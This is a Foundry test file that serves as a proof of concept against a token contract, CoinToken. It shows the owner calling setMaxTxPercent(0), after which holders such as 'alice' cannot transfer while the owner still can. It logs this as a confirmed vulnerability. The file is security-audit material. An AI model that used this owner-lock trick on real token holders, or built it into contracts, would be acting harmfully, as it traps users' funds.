// SPDX-License-Identifier: MIT
pragma solidity 0.8.4;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/CoinToken.sol";

contract MockWETH {}

contract MockUniswapV2Pair {
    function sync() external {}
}

contract MockUniswapV2Factory {
    address private mockPair;
    
    constructor() {
        mockPair = address(new MockUniswapV2Pair());
    }
    
    function createPair(address, address) external view returns (address) {
        return mockPair;
    }
}

contract MockUniswapV2Router {
    address public immutable factory;
    address public immutable WETH;

    constructor(address _factory, address _weth) {
        factory = _factory;
        WETH = _weth;
    }
    
    function addLiquidityETH(
        address,
        uint256,
        uint256,
        uint256,
        address,
        uint256
    ) external payable returns (uint256, uint256, uint256) {
        return (0, 0, 0);
    }
}

contract CoinTokenTest is Test {
    CoinToken token;
    address owner;
    address alice;
    address bob;
    
    MockUniswapV2Factory mockFactory;
    MockUniswapV2Router mockRouter;
    MockWETH mockWETH;
    
    uint constant TOTAL_SUPPLY = 1000000 * 10**18;

    function setUp() public {
        owner = address(this);
        alice = makeAddr("alice");
        bob = makeAddr("bob");
        
        // Deploy mock Uniswap ecosystem
        mockWETH = new MockWETH();
        mockFactory = new MockUniswapV2Factory();
        mockRouter = new MockUniswapV2Router(address(mockFactory), address(mockWETH));
        
        // Deploy token
        token = new CoinToken(
            "TestToken", 
            "TEST", 
            18, 
            1000000,                // 1M tokens
            1,                      // tax fee
            1,                      // liquidity fee
            1,                      // dev fee
            address(mockRouter),    // mock router
            makeAddr("devWallet"),  // dev wallet
            owner                   // token owner
        );
        
        // Disable automatic liquidity fees
        token.setSwapAndLiquifyEnabled(false);
        
        // Exclude test accounts from fees
        token.excludeFromFee(alice);
        token.excludeFromFee(bob);
        
        // Transfer tokens to Alice
        token.transfer(alice, 1000 ether);
    }

    function test_OwnerCanBlockTransactions() public {
        uint256 bobBalanceBefore = token.balanceOf(bob);
        
        // Alice transfers tokens to Bob - should succeed normally
        vm.prank(alice);
        token.transfer(bob, 500 ether);
        assertEq(token.balanceOf(bob) - bobBalanceBefore, 500 ether);
        
        console.log("--- BEFORE-Trigger setMaxTxPercent ---");
        uint256 maxTxAmountBefore = token._maxTxAmount();
        console.log("MaxTxAmount before: ", maxTxAmountBefore);

        console.log("--- Trigger setMaxTxPercent ---");
        // Owner sets transaction limit to zero
        token.setMaxTxPercent(0);
        
        console.log("--- AFTER-Trigger setMaxTxPercent ---");
        uint256 maxTxAmountAfter = token._maxTxAmount();
        console.log("MaxTxAmount after: ", maxTxAmountAfter);
        
        // Verify state change
        if (maxTxAmountAfter != maxTxAmountBefore && maxTxAmountAfter == 0) {
            console.log("Vulnerability Exists: MaxTxAmount successfully set to 0");
        } else {
            console.log("Vulnerability not Exist: MaxTxAmount unchanged or non-zero");
        }

        // Verify Alice now cannot transfer any tokens
        vm.prank(alice);
        vm.expectRevert("Transfer amount exceeds the maxTxAmount.");
        token.transfer(bob, 1 wei);
        
        // Owner can still transfer despite limit
        uint256 ownerTransferAmount = 100 ether;
        bobBalanceBefore = token.balanceOf(bob);
        token.transfer(bob, ownerTransferAmount);
        assertEq(token.balanceOf(bob) - bobBalanceBefore, ownerTransferAmount);
        
        // Final vulnerability verdict
        require(maxTxAmountAfter == 0, "Vulnerability not Exist");
        console.log("Vulnerability Exists: Owner bypassed transaction limits");
    }
}